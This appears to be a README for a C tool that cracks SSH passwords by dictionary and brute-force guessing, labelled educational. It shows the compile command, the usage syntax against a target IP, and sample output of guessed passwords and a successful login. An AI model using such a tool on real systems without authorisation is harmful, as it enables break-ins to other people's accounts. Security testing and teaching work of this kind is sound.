# SSH Password Cracker (C - Implementation)
  **[ For Educational Purpose ONLY ]**

Crack SSH Password using Dictionary and Brute Force Method

## Introduction
Secure Shell (SSH) is a cryptographic network protocol for operating network services securely over an unsecured network. The best known example application is for remote login to computer systems by users.

## Usage
```c
$ gcc -o sshbrute_b sshbrute_b.c -lssh
$
$ ./sshbrute_b 
Usage: ./sshbrute -t target -uf ufile [-pf pfile] [-po 22 (default)] [-b]

$
$ ./sshbrute_b -t <ip_address> -uf username.txt -pf password.txt

[*] User: username
[+] Password: toor -> Incorrect Password
[+] Password: root -> Incorrect Password
[+] Password: password -> Incorrect Password
[+] Password: correctpwd -> Connected


[*] Username: username
[*] Password: correctpwd

$
$ ./sshbrute_b -t <ip_address> -uf username.txt -b

[*] User: username
Enter the lenght of password: 8
[+] Password: aaaaaaaa -> Incorrect Password
[+] Password: aaaaaaab -> Incorrect Password
[+] Password: aaaaaaac -> Incorrect Password
[+] Password: aaaaaaad -> Incorrect Password
[+] Password: aaaaaaae -> Incorrect Password
[+] Password: aaaaaaaf -> 
Error authenticating with password: Received SSH_MSG_DISCONNECT: 33554432:Too many authentication failures

$
```
